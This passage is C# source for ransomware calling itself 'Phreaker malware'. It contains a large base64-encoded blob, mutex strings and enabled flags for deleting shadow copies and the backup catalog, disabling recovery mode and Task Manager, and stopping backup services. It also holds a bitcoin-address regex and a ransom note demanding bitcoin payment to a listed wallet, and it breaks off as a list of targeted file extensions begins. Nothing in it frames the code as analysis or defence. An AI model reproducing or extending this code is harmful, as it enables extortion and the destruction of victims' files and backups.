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";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string> { "Phreaker malware has infected your machine.", "Lucky for you this is based out of America and we pride ourseleves on helping you get your files back.", "", "Send a small bitcoin payment off 100$ to ", "bc1ql03f9tvvdj2hq8wshew956gk6fhpupfse2jz0q", "", "Email @protonmail of your payment and public key to recieve your private key and decryptor.", "", "" };

	private static string[] validExtensions = new string[229]
	{
